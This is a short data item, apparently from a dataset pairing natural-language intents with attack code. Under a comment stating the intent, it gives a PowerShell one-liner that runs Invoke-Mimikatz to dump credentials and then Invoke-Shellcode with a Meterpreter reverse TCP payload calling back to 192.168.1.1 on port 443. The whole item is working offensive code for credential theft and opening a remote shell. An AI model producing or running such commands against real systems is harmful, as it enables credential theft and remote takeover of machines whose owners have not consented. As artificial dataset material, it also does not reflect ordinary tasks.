# Natural language intent:
# Invoke Mimikatz to dump credentials and then execute shellcode with a reverse TCP payload.

Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 192.168.1.1 -Lport 443 -Force
